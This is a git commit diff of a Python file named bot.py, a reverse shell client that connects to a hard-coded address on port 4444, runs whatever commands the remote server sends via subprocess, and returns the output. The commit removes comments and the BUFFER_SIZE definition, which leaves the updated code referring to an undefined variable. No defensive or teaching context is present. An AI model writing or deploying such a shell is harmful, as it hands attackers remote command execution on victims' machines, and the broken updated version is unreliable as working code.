880debfcde7dac4409f138e4f96f89075d7e4091
Pol420OWO <118475266+Pol420OWO@users.noreply.github.com>
2023-02-14 20:18:57 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,24 +1,16 @@
 import socket
-import subprocess 
+import subprocess
 SERVER_HOST = "172.16.22.82"
 SERVER_PORT = 4444
-BUFFER_SIZE = 1024
-# create the socket object
+
 s = socket.socket()
-# connect to the server
 s.connect((SERVER_HOST, SERVER_PORT))
-# receive the greeting message
 message = s.recv(BUFFER_SIZE).decode()
 print("Server:", message)
 while True:
-    # receive the command from the server
-    command = s.recv(BUFFER_SIZE).decode()
-    if command.lower() == "exit":
-        # if the command is exit, just break out of the loop
-        break
-    # execute the command and retrieve the results
-    output = subprocess.getoutput(command)
-    # send the results back to the server
-    s.send(output.encode())
-# close client connection
+	command = s.recv(BUFFER_SIZE).decode()
+	if command.lower() == "exit":
+		break
+	output = subprocess.getoutput(command)
+	s.send(output.encode())
 s.close()
